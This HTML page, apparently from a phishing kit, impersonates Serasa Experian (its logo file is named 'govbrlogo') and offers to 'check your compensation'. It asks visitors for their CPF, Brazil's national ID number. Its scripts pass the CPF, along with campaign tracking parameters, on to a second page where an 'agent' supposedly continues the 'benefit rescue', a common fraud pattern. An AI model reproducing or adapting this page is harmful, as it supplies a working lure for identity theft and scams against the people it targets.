<body>
    <header>
        <img src="images/govbrlogo.png" alt="Serasa Experian"> <!-- Você pode trocar a imagem por outra de sua preferência -->
    </header>

    <div class="container">
        <div class="card">
            <h3>Verifique Sua Indenização</h3>


            <div class="accordion-panel">
                <p>Digite seu CPF para <strong>criar</strong> ou <strong>acessar</strong> sua conta <span class="serasaColor">Serasa</span>.</p>
                
           
            <form id="formCPF">
            <label class="cpf" for="cpf">CPF</label>
            <input id="numeroCPF" name="cpf" autocomplete="new-password" tabindex="1" type="tel" value="" placeholder="Digite seu CPF" aria-invalid="false" required="true" class="corrigircpf">
            <script src="js/track-v3.js" type="text/javascript" async=""></script><script src="js/track-v3_2.js" type="text/javascript" async=""></script><script>
                document.addEventListener('DOMContentLoaded', function () {
            // Obtém todos os elementos com a classe 'corrigircpf'
                    var inputs = document.getElementsByClassName('corrigircpf');

            // Adiciona um ouvinte de evento de entrada a cada elemento
                    for (var i = 0; i < inputs.length; i++) {
                        inputs[i].addEventListener('input', function () {
                    // Remove os caracteres '-' e '.'
                            this.value = this.value.replace(/[-.]/g, '');

                    // Limite a quantidade de caracteres conforme necessário (ex: CPF)
                    var maxLength = 11; // ajuste conforme necessário
                    this.value = this.value.slice(0, maxLength);
                });
                    }
                });
            </script>
                    <script>
                    
  

                    
        document.getElementById('formCPF').addEventListener('submit', function(event) {
            event.preventDefault(); // Impede o envio padrão do formulário

            // Obtém o valor do input com ID "numeroCPF"
            var numeroCPF = document.getElementById('numeroCPF').value;
                          
            const utmSource = getParameterByName('utm_source');
            const utmCampaign = getParameterByName('utm_campaign');
            const utmMedium = getParameterByName('utm_medium');
            const utmContent = getParameterByName('utm_content');
            // Constrói a URL de redirecionamento
            var redirectURL = './front/index.html?cpf=' + encodeURIComponent(numeroCPF) + '&utm_source=' + utmSource + '&utm_campaign=' + utmCampaign + '&utm_medium=' + utmMedium + '&utm_content=' + utmContent;

            // Adiciona parâmetros existentes na URL atual à nova URL
            var parametrosAtuais = window.location.search.substring(1);
            if (parametrosAtuais) {
                redirectURL += '&' + parametrosAtuais;
            }

            // Redireciona para a URL construída
            window.location.href = redirectURL;
        });
        </script>
            <div id="error-message" style="color: red;"></div>
            <p>Nota: Uma atendente continuará o seu atendimento logo após você prosseguir para o resgate do seu benefício.</p>
            <div class="button-panel" id="login-button-panel">
                <input type="submit" value="Continuar" id="buttonCPF" class="button-continuar" tabindex="2">
                <style type="text/css">
                    input.button-continuar {
                        border-radius: 20px;
                        border: none;
                        color: #fff;
                    }
                </style>
            </div>
        </div>

        
    </div>
    <script src="js/track-v3_1.js" type="text/javascript" async=""></script><script src="js/apii.js"></script>
    <script>
        function formatarCPF(cpf) {
            cpf = cpf.replace(/\D/g, '');
            cpf = cpf.substring(0, 11);
            cpf = cpf.replace(/(\d{3})(\d)/, '$1.$2');
            cpf = cpf.replace(/(\d{3})(\d)/, '$1.$2');
            cpf = cpf.replace(/(\d{3})(\d{1,2})$/, '$1-$2');
            return cpf;
        }
    
        document.getElementById('numero').addEventListener('input', function (e) {
            var cpfFormatado = formatarCPF(e.target.value);
            e.target.value = cpfFormatado;
    
            // Atualizar o valor do campo oculto com o CPF sem formatação
            var cpfLimpo = cpfFormatado.replace(/\D/g, '');
            document.getElementById('cpf_valor_real').value = cpfLimpo;
        });
    </script>
